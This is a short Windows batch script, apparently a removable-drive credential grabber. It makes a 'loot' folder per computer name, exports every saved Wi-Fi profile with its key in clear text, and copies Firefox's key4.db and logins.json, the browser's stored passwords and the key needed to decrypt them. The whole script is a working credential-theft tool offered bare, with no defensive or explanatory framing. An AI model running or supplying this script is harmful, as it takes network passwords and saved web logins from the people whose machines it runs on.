mkdir %~dp0\loot\%COMPUTERNAME%
cd /D %~dp0\loot\%COMPUTERNAME% && netsh wlan export profile key=clear
C: cd \D %appdata%\mozilla\firefox\profiles\
cd %appdata%\mozilla\firefox\profiles\*.default-release\
copy key4.db %~dp0\loot\%COMPUTERNAME%
copy logins.json %~dp0\loot\%COMPUTERNAME%